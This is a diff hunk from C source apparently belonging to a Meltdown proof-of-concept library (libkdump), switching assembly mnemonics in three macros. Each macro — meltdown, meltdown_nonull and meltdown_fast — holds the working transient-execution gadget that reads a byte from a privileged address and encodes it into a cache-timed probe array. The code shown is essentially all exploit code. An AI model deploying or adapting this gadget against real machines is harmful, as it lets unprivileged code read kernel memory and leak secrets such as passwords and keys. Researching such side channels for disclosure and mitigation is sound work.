@@ -82,35 +82,35 @@ static libkdump_config_t config;
 
 // ---------------------------------------------------------------------------
 #define meltdown                                                               \
- asm volatile("xorl %%eax, %%eax\n"                                            \
+ asm volatile("xor %%eax, %%eax\n"                                            \
               "1:\n"                                                           \
               "movl (%%esi), %%esi\n"                                          \
               "movb (%%ecx), %%al\n"                                           \
               "shl $12, %%eax\n"                                               \
               "jz 1b\n"                                                        \
-              "movl (%%ebx,%%eax,1), %%ebx\n"                                  \
+              "mov (%%ebx,%%eax,1), %%ebx\n"                                  \
               :                                                                \
               : "c"(phys), "b"(mem), "S"(0)                                    \
               : "eax");
 
 // ---------------------------------------------------------------------------
 #define meltdown_nonull                                                        \
-  asm volatile("xorl %%eax, %%eax\n"                                           \
+  asm volatile("xor %%eax, %%eax\n"                                           \
                "1:\n"                                                          \
                "movb (%%ecx), %%al\n"                                          \
                "shl $12, %%eax\n"                                              \
                "jz 1b\n"                                                       \
-               "movl (%%ebx,%%eax,1), %%ebx\n"                                 \
+               "mov (%%ebx,%%eax,1), %%ebx\n"                                 \
                :                                                               \
                : "c"(phys), "b"(mem)                                           \
                : "eax");
 
 // ---------------------------------------------------------------------------
 #define meltdown_fast                                                          \
-  asm volatile("xorl %%eax, %%eax\n"                                           \
+  asm volatile("xor %%eax, %%eax\n"                                           \
                "movb (%%ecx), %%al\n"                                          \
                "shl $12, %%eax\n"                                              \
-               "movl (%%ebx,%%eax,1), %%ebx\n"                                 \
+               "mov (%%ebx,%%eax,1), %%ebx\n"                                 \
                :                                                               \
                : "c"(phys), "b"(mem)                                           \
                : "eax");
